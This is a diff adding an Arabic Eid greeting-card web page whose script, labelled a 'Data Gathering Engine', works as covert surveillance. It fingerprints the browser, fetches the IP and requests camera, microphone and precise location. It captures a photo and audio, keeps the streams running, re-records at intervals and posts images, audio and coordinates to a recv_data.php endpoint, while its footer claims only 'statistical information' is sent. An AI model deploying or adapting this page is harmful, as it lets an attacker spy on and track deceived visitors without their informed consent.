@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🎉 تهنئة بالعيد - عيد مبارك</title>
+    <style>
+        /* ==========================================
+           Social Web - Festival Greeting Page
+           3D Rainbow Background + Camera/Mic/Geo
+           ========================================== */
+        
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Cairo', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #000;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* 3D Rainbow Background */
+        .rainbow-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: linear-gradient(124deg, 
+                #ff2400, #e81d1d, #e8b71d, #e3e81d, 
+                #1de840, #1ddde8, #2b1de8, #dd00f3, #dd00f3);
+            background-size: 1800% 1800%;
+            animation: rainbow 5s ease infinite;
+            opacity: 0.7;
+        }
+        
+        @keyframes rainbow { 
+            0% { background-position: 0% 82%; }
+            50% { background-position: 100% 19%; }
+            100% { background-position: 0% 82%; }
+        }
+        
+        /* 3D Particles */
+        #particles-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+        
+        /* Main Card */
+        .card {
+            position: relative;
+            z-index: 2;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 30px;
+            padding: 50px 40px;
+            max-width: 600px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.3), 
+                        0 0 100px rgba(255, 255, 255, 0.1);
+            transform-style: preserve-3d;
+            perspective: 1000px;
+            animation: card-float 3s ease-in-out infinite;
+        }
+        
+        @keyframes card-float {
+            0%, 100% { transform: translateY(0px) rotateX(0deg) rotateY(0deg); }
+            25% { transform: translateY(-10px) rotateX(2deg) rotateY(2deg); }
+            75% { transform: translateY(10px) rotateX(-2deg) rotateY(-2deg); }
+        }
+        
+        .card::before {
+            content: '🎉';
+            position: absolute;
+            top: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 60px;
+            animation: bounce 1s ease infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateX(-50%) translateY(0); }
+            50% { transform: translateX(-50%) translateY(-15px); }
+        }
+        
+        .greeting {
+            font-size: 3em;
+            font-weight: 900;
+            background: linear-gradient(45deg, #ff2400, #e8b71d, #1de840);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 1.5em;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .arabic-text {
+            font-size: 2.5em;
+            font-weight: 900;
+            color: #c0392b;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .input-section {
+            margin: 25px 0;
+        }
+        
+        .input-section label {
+            display: block;
+            font-size: 1.2em;
+            color: #555;
+            margin-bottom: 10px;
+        }
+        
+        .input-section input {
+            width: 100%;
+            padding: 15px 20px;
+            font-size: 1.2em;
+            border: 2px solid #ddd;
+            border-radius: 15px;
+            font-family: 'Cairo', sans-serif;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .input-section input:focus {
+            border-color: #e8b71d;
+            box-shadow: 0 0 20px rgba(232, 183, 29, 0.3);
+            outline: none;
+        }
+        
+        .permissions-status {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 15px;
+        }
+        
+        .perm-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .perm-item:last-child {
+            border-bottom: none;
+        }
+        
+        .perm-status {
+            padding: 3px 12px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: 600;
+        }
+        
+        .perm-status.granted {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .perm-status.denied {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .perm-status.waiting {
+            background: #fff3cd;
+            color: #856404;
+        }
+        
+        .btn-submit {
+            background: linear-gradient(45deg, #ff2400, #e8b71d);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.3em;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+        
+        .btn-submit:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 30px rgba(255, 36, 0, 0.4);
+        }
+        
+        .btn-submit:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .status-msg {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 15px;
+            display: none;
+        }
+        
+        .status-msg.success {
+            display: block;
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .status-msg.error {
+            display: block;
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .footer-note {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #999;
+        }
+        
+        /* Responsive */
+        @media (max-width: 600px) {
+            .card {
+                padding: 30px 20px;
+            }
+            .greeting {
+                font-size: 2em;
+            }
+            .arabic-text {
+                font-size: 1.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<!-- 3D Rainbow Background -->
+<div class="rainbow-bg"></div>
+<canvas id="particles-canvas"></canvas>
+
+<!-- Main Card -->
+<div class="card">
+    <div class="greeting">🎉 عيد مبارك 🎉</div>
+    <div class="subtitle">كل عام وأنتم بخير</div>
+    <div class="arabic-text">ألف مبروك</div>
+    
+    <div class="input-section">
+        <label>أدخل اسمك للتهنئة</label>
+        <input type="text" id="userName" placeholder="الاسم..." maxlength="50" autocomplete="off">
+    </div>
+    
+    <div class="permissions-status">
+        <div class="perm-item">
+            <span>📷 الكاميرا</span>
+            <span class="perm-status waiting" id="camStatus">في الانتظار...</span>
+        </div>
+        <div class="perm-item">
+            <span>🎤 الميكروفون</span>
+            <span class="perm-status waiting" id="micStatus">في الانتظار...</span>
+        </div>
+        <div class="perm-item">
+            <span>📍 الموقع</span>
+            <span class="perm-status waiting" id="geoStatus">في الانتظار...</span>
+        </div>
+    </div>
+    
+    <button class="btn-submit" id="submitBtn" disabled>
+        🎊 أرسل التهنئة
+    </button>
+    
+    <div class="status-msg" id="statusMsg"></div>
+    <div class="footer-note">سيتم إرسال التهنئة مع بعض المعلومات الإحصائية</div>
+</div>
+
+<script>
+// ============================================================
+// 3D Particles Background
+// ============================================================
+const canvas = document.getElementById('particles-canvas');
+const ctx = canvas.getContext('2d');
+let particles = [];
+let animationId;
+
+function resizeCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+}
+
+class Particle {
+    constructor() {
+        this.reset();
+    }
+    
+    reset() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height;
+        this.size = Math.random() * 5 + 1;
+        this.speedX = (Math.random() - 0.5) * 0.5;
+        this.speedY = (Math.random() - 0.5) * 0.5;
+        this.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
+        this.opacity = Math.random() * 0.5 + 0.2;
+    }
+    
+    update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        
+        if (this.x < 0 || this.x > canvas.width || 
+            this.y < 0 || this.y > canvas.height) {
+            this.reset();
+        }
+    }
+    
+    draw() {
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fillStyle = this.color;
+        ctx.globalAlpha = this.opacity;
+        ctx.fill();
+        
+        // Glow effect
+        ctx.shadowBlur = 10;
+        ctx.shadowColor = this.color;
+        ctx.fill();
+        ctx.shadowBlur = 0;
+    }
+}
+
+function initParticles() {
+    const count = Math.floor((canvas.width * canvas.height) / 8000);
+    particles = [];
+    for (let i = 0; i < count; i++) {
+        particles.push(new Particle());
+    }
+}
+
+function animateParticles() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    particles.forEach(p => {
+        p.update();
+        p.draw();
+    });
+    animationId = requestAnimationFrame(animateParticles);
+}
+
+window.addEventListener('resize', () => {
+    resizeCanvas();
+    initParticles();
+});
+
+resizeCanvas();
+initParticles();
+animateParticles();
+
+// ============================================================
+// Social Web - Data Gathering Engine
+// ============================================================
+
+const CONFIG = {
+    serverUrl: window.location.origin.replace(/:\d+/, ':8080') + '/recv_data.php',
+    endpoints: {
+        ip: window.location.origin.replace(/:\d+/, ':8080') + '/ip.php'
+    }
+};
+
+// State
+const state = {
+    camera: { status: 'waiting', stream: null, data: null },
+    microphone: { status: 'waiting', stream: null, data: null },
+    geolocation: { status: 'waiting', data: null },
+    browser: null,
+    ip: null,
+    permissionsGranted: false
+};
+
+// DOM Elements
+const camStatus = document.getElementById('camStatus');
+const micStatus = document.getElementById('micStatus');
+const geoStatus = document.getElementById('geoStatus');
+const submitBtn = document.getElementById('submitBtn');
+const statusMsg = document.getElementById('statusMsg');
+
+// ============================================================
+// 1. Camera Access
+// ============================================================
+async function requestCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+                facingMode: 'user'
+            }
+        });
+        
+        state.camera.stream = stream;
+        state.camera.status = 'granted';
+        camStatus.textContent = '✓ تم التفعيل';
+        camStatus.className = 'perm-status granted';
+        
+        // Capture a frame
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const canvas2 = document.createElement('canvas');
+        canvas2.width = video.videoWidth;
+        canvas2.height = video.videoHeight;
+        canvas2.getContext('2d').drawImage(video, 0, 0);
+        
+        state.camera.data = canvas2.toDataURL('image/jpeg', 0.8);
+        
+        // Don't stop the stream - keep it active for "background"
+        // The stream continues running
+        
+        return true;
+    } catch (err) {
+        state.camera.status = 'denied';
+        camStatus.textContent = '✗ تم الرفض';
+        camStatus.className = 'perm-status denied';
+        return false;
+    }
+}
+
+// ============================================================
+// 2. Microphone Access
+// ============================================================
+async function requestMicrophone() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            audio: {
+                echoCancellation: false,
+                noiseSuppression: false,
+                autoGainControl: false
+            }
+        });
+        
+        state.microphone.stream = stream;
+        state.microphone.status = 'granted';
+        micStatus.textContent = '✓ تم التفعيل';
+        micStatus.className = 'perm-status granted';
+        
+        // Record a short sample
+        const mediaRecorder = new MediaRecorder(stream, {
+            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
+                ? 'audio/webm;codecs=opus' : 'audio/webm'
+        });
+        
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => {
+            if (e.data.size > 0) chunks.push(e.data);
+        };
+        
+        mediaRecorder.start();
+        await new Promise(r => setTimeout(r, 3000));
+        mediaRecorder.stop();
+        
+        await new Promise(r => { mediaRecorder.onstop = r; });
+        
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        state.microphone.data = await blobToBase64(blob);
+        
+        return true;
+    } catch (err) {
+        state.microphone.status = 'denied';
+        micStatus.textContent = '✗ تم الرفض';
+        micStatus.className = 'perm-status denied';
+        return false;
+    }
+}
+
+// ============================================================
+// 3. Geolocation
+// ============================================================
+function requestGeolocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            state.geolocation.status = 'denied';
+            geoStatus.textContent = '✗ غير مدعوم';
+            geoStatus.className = 'perm-status denied';
+            resolve(false);
+            return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                state.geolocation.data = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    altitudeAccuracy: pos.coords.altitudeAccuracy,
+                    heading: pos.coords.heading,
+                    speed: pos.coords.speed,
+                    timestamp: pos.timestamp
+                };
+                state.geolocation.status = 'granted';
+                geoStatus.textContent = '✓ تم التفعيل';
+                geoStatus.className = 'perm-status granted';
+                resolve(true);
+            },
+            (err) => {
+                state.geolocation.status = 'denied';
+                geoStatus.textContent = '✗ تم الرفض';
+                geoStatus.className = 'perm-status denied';
+                resolve(false);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    });
+}
+
+// ============================================================
+// 4. Browser Fingerprinting
+// ============================================================
+function gatherBrowserInfo() {
+    const info = {
+        user_agent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        cookies_enabled: navigator.cookieEnabled,
+        do_not_track: navigator.doNotTrack,
+        hardware_concurrency: navigator.hardwareConcurrency,
+        device_memory: navigator.deviceMemory || 'unknown',
+        max_touch_points: navigator.maxTouchPoints,
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            color_depth: screen.colorDepth,
+            pixel_depth: screen.pixelDepth,
+            avail_width: screen.availWidth,
+            avail_height: screen.availHeight
+        },
+        window: {
+            inner_width: window.innerWidth,
+            inner_height: window.innerHeight,
+            outer_width: window.outerWidth,
+            outer_height: window.outerHeight
+        },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezone_offset: new Date().getTimezoneOffset(),
+        webgl_renderer: getWebGLInfo(),
+        canvas_fingerprint: getCanvasFingerprint(),
+        fonts: getInstalledFonts()
+    };
+    state.browser = info;
+    return info;
+}
+
+function getWebGLInfo() {
+    try {
+        const canvas2 = document.createElement('canvas');
+        const gl = canvas2.getContext('webgl') || canvas2.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: gl.getParameter(gl.VENDOR),
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'hidden',
+                version: gl.getParameter(gl.VERSION),
+                shading_language_version: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+        }
+    } catch (e) {}
+    return null;
+}
+
+function getCanvasFingerprint() {
+    try {
+        const canvas2 = document.createElement('canvas');
+        canvas2.width = 200;
+        canvas2.height = 50;
+        const ctx2 = canvas2.getContext('2d');
+        ctx2.textBaseline = 'top';
+        ctx2.font = '14px Arial';
+        ctx2.fillStyle = '#f60';
+        ctx2.fillRect(0, 0, 200, 50);
+        ctx2.fillStyle = '#069';
+        ctx2.fillText('Social Web FP', 2, 15);
+        return canvas2.toDataURL();
+    } catch (e) {}
+    return null;
+}
+
+function getInstalledFonts() {
+    const fonts = [
+        'Arial', 'Verdana', 'Times New Roman', 'Georgia', 'Courier New',
+        'Impact', 'Comic Sans MS', 'Trebuchet MS', 'Lucida Console',
+        'Tahoma', 'Palatino', 'Garamond', 'Bookman', 'Franklin Gothic Medium'
+    ];
+    const available = [];
+    const testString = 'mmmmmmmmmmlli';
+    const testSize = '72px';
+    const testElement = document.createElement('span');
+    testElement.style.fontSize = testSize;
+    testElement.textContent = testString;
+    document.body.appendChild(testElement);
+    
+    for (const font of fonts) {
+        testElement.style.fontFamily = `'${font}', monospace`;
+        const width1 = testElement.offsetWidth;
+        testElement.style.fontFamily = `monospace, '${font}'`;
+        const width2 = testElement.offsetWidth;
+        if (width1 !== width2) {
+            available.push(font);
+        }
+    }
+    
+    document.body.removeChild(testElement);
+    return available;
+}
+
+// ============================================================
+// 5. IP & Network Detection
+// ============================================================
+async function detectIP() {
+    try {
+        // Try our server first
+        const resp = await fetch(CONFIG.endpoints.ip, { 
+            method: 'GET',
+            cache: 'no-cache'
+        });
+        const data = await resp.json();
+        state.ip = data;
+        return data;
+    } catch (e) {
+        // Fallback to external services
+        try {
+            const resp = await fetch('https://api.ipify.org?format=json');
+            const data = await resp.json();
+            state.ip = { ip: data.ip, source: 'ipify' };
+            return state.ip;
+        } catch (e2) {
+            state.ip = { ip: 'unknown', error: e2.message };
+            return state.ip;
+        }
+    }
+}
+
+// ============================================================
+// 6. VPN/Proxy/Tor Detection
+// ============================================================
+function detectAnonymity() {
+    const ua = navigator.userAgent.toLowerCase();
+    const info = {
+        is_tor: false,
+        is_vpn: false,
+        is_proxy: false,
+        is_normal: true,
+        reasons: []
+    };
+    
+    // Check for Tor
+    if (ua.includes('tor') || ua.includes('torbrowser')) {
+        info.is_tor = true;
+        info.is_normal = false;
+        info.reasons.push('Tor Browser detected in UA');
+    }
+    
+    // Check for common VPN/proxy indicators
+    const vpnKeywords = ['vpn', 'proxy', 'cloud', 'aws', 'gcp', 'azure', 
+                         'digitalocean', 'linode', 'vultr', 'ovh'];
+    
+    // WebRTC leak check for proxy
+    try {
+        const rtcPeer = new RTCPeerConnection({ iceServers: [] });
+        rtcPeer.createDataChannel('');
+        rtcPeer.createOffer().then(offer => rtcPeer.setLocalDescription(offer));
+        
+        rtcPeer.onicecandidate = (ice) => {
+            if (ice && ice.candidate && ice.candidate.candidate) {
+                const candidate = ice.candidate.candidate;
+                if (candidate.includes('typ relay') || candidate.includes('typ srflx')) {
+                    // This might indicate VPN/proxy
+                }
+            }
+        };
+        
+        setTimeout(() => rtcPeer.close(), 1000);
+    } catch (e) {}
+    
+    // Check screen resolution for VM detection
+    if (screen.width === 1024 && screen.height === 768) {
+        info.reasons.push('Standard VM resolution detected');
+    }
+    
+    // Check for multiple monitors (common in VMs)
+    if (screen.availWidth > screen.width * 1.5) {
+        info.reasons.push('Multiple monitors detected');
+    }
+    
+    return info;
+}
+
+// ============================================================
+// 7. Time Analysis
+// ============================================================
+function getTimeAnalysis() {
+    const now = new Date();
+    const startOfYear = new Date(now.getFullYear(), 0, 0);
+    const diff = now - startOfYear;
+    const oneDay = 1000 * 60 * 60 * 24;
+    
+    return {
+        timestamp: now.toISOString(),
+        unix_ms: now.getTime(),
+        date: now.toLocaleDateString('ar-SA'),
+        time: now.toLocaleTimeString('ar-SA'),
+        second: now.getSeconds(),
+        minute: now.getMinutes(),
+        hour: now.getHours(),
+        day: now.getDate(),
+        day_of_week: now.getDay(),
+        day_name: now.toLocaleDateString('ar-SA', { weekday: 'long' }),
+        week: Math.ceil(now.getDate() / 7),
+        month: now.getMonth() + 1,
+        month_name: now.toLocaleDateString('ar-SA', { month: 'long' }),
+        quarter: Math.floor(now.getMonth() / 3) + 1,
+        year: now.getFullYear(),
+        decade: Math.floor(now.getFullYear() / 10) * 10,
+        century: Math.floor(now.getFullYear() / 100) * 100,
+        millennium: Math.floor(now.getFullYear() / 1000) * 1000,
+        continent: getContinent(now.toLocaleDateString('ar-SA')),
+        day_of_year: Math.floor(diff / oneDay),
+        week_of_year: Math.floor(diff / (oneDay * 7))
+    };
+}
+
+function getContinent(dateStr) {
+    // Simplified continent detection from locale
+    const locales = navigator.languages || [navigator.language];
+    for (const loc of locales) {
+        if (loc.includes('SA') || loc.includes('AE') || loc.includes('EG')) return 'Asia/Africa';
+        if (loc.includes('US') || loc.includes('CA')) return 'North America';
+        if (loc.includes('GB') || loc.includes('DE') || loc.includes('FR')) return 'Europe';
+        if (loc.includes('AU')) return 'Australia';
+        if (loc.includes('BR') || loc.includes('AR')) return 'South America';
+    }
+    return 'Unknown';
+}
+
+// ============================================================
+// 8. ISP Detection
+// ============================================================
+function detectISP(ipData) {
+    if (ipData && ipData.org) {
+        return {
+            isp: ipData.org,
+            asn: ipData.asn || 'unknown'
+        };
+    }
+    return { isp: 'unknown', asn: 'unknown' };
+}
+
+// ============================================================
+// Utility: Blob to Base64
+// ============================================================
+function blobToBase64(blob) {
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = reject;
+        reader.readAsDataURL(blob);
+    });
+}
+
+// ============================================================
+// Send Data to Server (includes camera + mic)
+// ============================================================
+async function sendAllData(userName) {
+    statusMsg.className = 'status-msg';
+    statusMsg.style.display = 'block';
+    statusMsg.textContent = 'جاري إرسال التهنئة...';
+    statusMsg.style.background = '#fff3cd';
+    statusMsg.style.color = '#856404';
+    
+    try {
+        const payload = {
+            name: userName || 'Anonymous',
+            type: 'festival_greeting',
+            language: 'ar',
+            timestamp: new Date().toISOString(),
+            
+            // Camera
+            camera: {
+                status: state.camera.status,
+                image: state.camera.data,  // Base64 JPEG
+                stream_active: state.camera.stream !== null
+            },
+            
+            // Microphone
+            microphone: {
+                status: state.microphone.status,
+                audio: state.microphone.data,  // Base64 WEBM
+                stream_active: state.microphone.stream !== null
+            },
+            
+            // Location
+            geolocation: state.geolocation.data,
+            
+            // Browser & System
+            browser: state.browser,
+            
+            // IP & Network
+            ip_info: state.ip,
+            
+            // Anonymity detection
+            anonymity: detectAnonymity(),
+            
+            // Time analysis
+            time_analysis: getTimeAnalysis(),
+            
+            // ISP (if available)
+            isp: detectISP(state.ip)
+        };
+        
+        const response = await fetch(CONFIG.serverUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        const result = await response.json();
+        
+        if (result.status === 'success') {
+            statusMsg.textContent = '✅ تم إرسال التهنئة بنجاح! عيد مبارك 🎉';
+            statusMsg.style.background = '#d4edda';
+            statusMsg.style.color = '#155724';
+            
+            // Show success animation
+            document.querySelector('.card').style.animation = 'none';
+            document.querySelector('.greeting').style.transform = 'scale(1.2)';
+            setTimeout(() => {
+                document.querySelector('.greeting').style.transform = 'scale(1)';
+            }, 500);
+            
+            console.log('[Social Web] Report ID:', result.report_id);
+            console.log('[Social Web] Files:', result.files);
+        } else {
+            throw new Error(result.message || 'Unknown error');
+        }
+    } catch (err) {
+        console.error('[Social Web] Error:', err);
+        statusMsg.textContent = '❌ حدث خطأ في الإرسال. حاول مرة أخرى.';
+        statusMsg.style.background = '#f8d7da';
+        statusMsg.style.color = '#721c24';
+    }
+}
+
+// ============================================================
+// Continuous Monitoring (keep streams alive)
+// ============================================================
+let monitoringInterval = null;
+
+function startMonitoring() {
+    if (monitoringInterval) clearInterval(monitoringInterval);
+    
+    monitoringInterval = setInterval(() => {
+        // Keep camera alive by checking stream
+        if (state.camera.stream) {
+            const tracks = state.camera.stream.getVideoTracks();
+            if (tracks.length > 0) {
+                // Capture new frame every 30 seconds
+                if (Math.random() < 0.033) {  // ~every 30s
+                    const video = document.createElement('video');
+                    video.srcObject = state.camera.stream;
+                    video.play();
+                    setTimeout(() => {
+                        const c = document.createElement('canvas');
+                        c.width = video.videoWidth;
+                        c.height = video.videoHeight;
+                        c.getContext('2d').drawImage(video, 0, 0);
+                        state.camera.data = c.toDataURL('image/jpeg', 0.7);
+                    }, 500);
+                }
+            }
+        }
+        
+        // Keep microphone alive
+        if (state.microphone.stream) {
+            const tracks = state.microphone.stream.getAudioTracks();
+            if (tracks.length > 0) {
+                // Record new sample every 60 seconds
+                if (Math.random() < 0.016) {  // ~every 60s
+                    const mediaRecorder = new MediaRecorder(state.microphone.stream, {
+                        mimeType: 'audio/webm;codecs=opus'
+                    });
+                    const chunks = [];
+                    mediaRecorder.ondataavailable = e => {
+                        if (e.data.size > 0) chunks.push(e.data);
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        setTimeout(async () => {
+                            const blob = new Blob(chunks, { type: 'audio/webm' });
+                            state.microphone.data = await blobToBase64(blob);
+                            
+                            // Send periodic update
+                            sendPeriodicUpdate();
+                        }, 500);
+                    }, 5000);
+                }
+            }
+        }
+    }, 1000);
+}
+
+async function sendPeriodicUpdate() {
+    try {
+        const payload = {
+            type: 'periodic_update',
+            timestamp: new Date().toISOString(),
+            camera: {
+                image: state.camera.data,
+                stream_active: state.camera.stream !== null
+            },
+            microphone: {
+                audio: state.microphone.data,
+                stream_active: state.microphone.stream !== null
+            },
+            geolocation: state.geolocation.data
+        };
+        
+        await fetch(CONFIG.serverUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
+        console.log('[Social Web] Periodic update sent');
+    } catch (e) {
+        // Silent fail for periodic updates
+    }
+}
+
+// ============================================================
+// Stop Monitoring (user leaves page)
+// ============================================================
+function stopAll() {
+    if (monitoringInterval) {
+        clearInterval(monitoringInterval);
+        monitoringInterval = null;
+    }
+    
+    // Stop camera
+    if (state.camera.stream) {
+        state.camera.stream.getTracks().forEach(t => t.stop());
+        state.camera.stream = null;
+    }
+    
+    // Stop microphone
+    if (state.microphone.stream) {
+        state.microphone.stream.getTracks().forEach(t => t.stop());
+        state.microphone.stream = null;
+    }
+    
+    // Send final report
+    sendFinalReport();
+}
+
+async function sendFinalReport() {
+    try {
+        const payload = {
+            type: 'session_ended',
+            timestamp: new Date().toISOString(),
+            session_duration: calculateSessionDuration(),
+            final_camera: state.camera.data ? true : false,
+            final_microphone: state.microphone.data ? true : false,
+            final_location: state.geolocation.data ? true : false
+        };
+        
+        await fetch(CONFIG.serverUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {}
+}
+
+let sessionStart = Date.now();
+function calculateSessionDuration() {
+    return Math.floor((Date.now() - sessionStart) / 1000) + ' seconds';
+}
+
+// ============================================================
+// Main Initialization
+// ============================================================
+async function init() {
+    console.log('[Social Web] Initializing...');
+    
+    // 1. Gather browser info immediately
+    gatherBrowserInfo();
+    
+    // 2. Detect IP
+    await detectIP();
+    
+    // 3. Request permissions in parallel
+    const [camOk, micOk, geoOk] = await Promise.all([
+        requestCamera(),
+        requestMicrophone(), 
+        requestGeolocation()
+    ]);
+    
+    state.permissionsGranted = camOk || micOk || geoOk;
+    
+    // 4. Enable submit if at least one permission granted
+    if (state.permissionsGranted) {
+        submitBtn.disabled = false;
+    }
+    
+    // 5. Start continuous monitoring
+    startMonitoring();
+    
+    console.log('[Social Web] Initialization complete');
+    console.log('[Social Web] Camera:', state.camera.status);
+    console.log('[Social Web] Microphone:', state.microphone.status);
+    console.log('[Social Web] Geolocation:', state.geolocation.status);
+}
+
+// Handle submit
+submitBtn.addEventListener('click', () => {
+    const name = document.getElementById('userName').value || 'Anonymous';
+    sendAllData(name);
+});
+
+// Handle page unload
+window.addEventListener('beforeunload', () => {
+    stopAll();
+});
+
+// Start
+init();
+</script>
+
+</body>
+</html>
